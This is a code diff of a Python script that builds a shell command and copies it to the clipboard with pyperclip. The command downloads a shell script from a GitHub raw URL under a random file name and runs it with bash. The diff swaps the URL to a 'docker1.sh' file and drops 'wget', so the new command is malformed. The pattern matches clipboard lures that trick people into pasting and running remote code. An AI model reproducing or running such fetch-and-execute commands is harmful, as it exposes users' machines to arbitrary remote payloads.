@@ -14,7 +14,7 @@ def generate_random_filename(length=8):
 random_filename = generate_random_filename()
 
 # Construct the command
-command = f"wget https://raw.githubusercontent.com/Fiujol/Hoym/refs/heads/main/docker.sh -O {random_filename} && bash {random_filename}"
+command = f"https://raw.githubusercontent.com/Fiujol/Hoym/refs/heads/main/docker1.sh -O {random_filename} && bash {random_filename}"
 
 # Copy the command to clipboard
 pyperclip.copy(command)
